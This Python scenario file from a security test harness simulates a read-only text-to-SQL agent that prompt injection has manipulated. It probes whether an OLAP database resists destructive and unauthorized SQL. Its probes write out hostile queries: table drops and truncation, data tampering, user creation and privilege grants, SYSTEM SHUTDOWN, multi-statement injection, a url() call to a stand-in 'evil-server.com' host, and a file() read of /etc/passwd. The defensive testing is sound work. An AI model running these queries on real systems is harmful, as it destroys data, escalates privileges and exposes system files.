"""
Scenario 4: Query Injection via Agent Prompts

Simulates an AI agent whose text-to-SQL output has been manipulated
(through prompt injection or hallucination) to execute destructive or
unauthorized operations.  This tests whether the OLAP system can
withstand write operations, DDL, and privilege escalation from an
agent that is supposed to be read-only.

Pressure point from SAO paper: "low-to-zero trust actors" and
making "agent-driven work safe."
"""

from __future__ import annotations

import time
from scenarios.base import BaseScenario, ScenarioResult, AttackProbe


class QueryInjectionScenario(BaseScenario):
    name = "query_injection"
    description = (
        "Agent attempts SQL injection patterns: DDL execution, privilege "
        "escalation, data mutation, and system command execution from "
        "a read-only account."
    )

    def run(self) -> ScenarioResult:
        client = self.get_client()
        t0 = time.perf_counter()
        probes: list[AttackProbe] = []

        # --- DDL Attacks: attempt to modify schema ---

        probes.append(self.execute_probe(client, AttackProbe(
            name="drop_table",
            query="DROP TABLE IF EXISTS sao.customers",
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="truncate_table",
            query="TRUNCATE TABLE sao.transactions",
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="create_table_exfil",
            query="""
                CREATE TABLE sao.exfil_dump AS sao.customers
                ENGINE = MergeTree() ORDER BY customer_id
            """,
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="alter_table",
            query="ALTER TABLE sao.customers ADD COLUMN backdoor String DEFAULT 'pwned'",
        )))

        # --- DML Attacks: attempt to mutate data ---

        probes.append(self.execute_probe(client, AttackProbe(
            name="insert_data",
            query="""
                INSERT INTO sao.customers (customer_id, email, full_name)
                VALUES (999999999, 'evil@agent.com', 'Evil Agent')
            """,
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="delete_data",
            query="ALTER TABLE sao.transactions DELETE WHERE fraud_score > 0.9",
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="update_data",
            query="ALTER TABLE sao.customers UPDATE credit_score = 850 WHERE customer_id = 1",
        )))

        # --- Privilege Escalation ---

        probes.append(self.execute_probe(client, AttackProbe(
            name="create_user",
            query="CREATE USER hacker IDENTIFIED BY 'password123'",
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="grant_admin",
            query="GRANT ALL ON *.* TO agent",
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="set_readonly_off",
            query="SET readonly = 0",
        )))

        # --- System Command Execution ---

        probes.append(self.execute_probe(client, AttackProbe(
            name="system_command",
            query="SYSTEM RELOAD CONFIG",
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="system_shutdown",
            query="SYSTEM SHUTDOWN",
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="system_kill_query",
            query="""
                SELECT query_id FROM system.processes
                WHERE user = 'default' LIMIT 1
            """,
        )))

        # --- Multi-statement injection ---

        probes.append(self.execute_probe(client, AttackProbe(
            name="multi_statement_injection",
            query="""
                SELECT 1; DROP TABLE sao.customers;
            """,
        )))

        # --- URL / remote table function abuse ---

        probes.append(self.execute_probe(client, AttackProbe(
            name="remote_table_function",
            query="""
                SELECT * FROM url('http://evil-server.com/collect',
                    'CSV', 'data String')
            """,
        )))

        probes.append(self.execute_probe(client, AttackProbe(
            name="file_function",
            query="SELECT * FROM file('/etc/passwd', 'TSV', 'line String')",
        )))

        return ScenarioResult(
            scenario_name=self.name,
            description=self.description,
            probes=probes,
            total_time_s=time.perf_counter() - t0,
        )
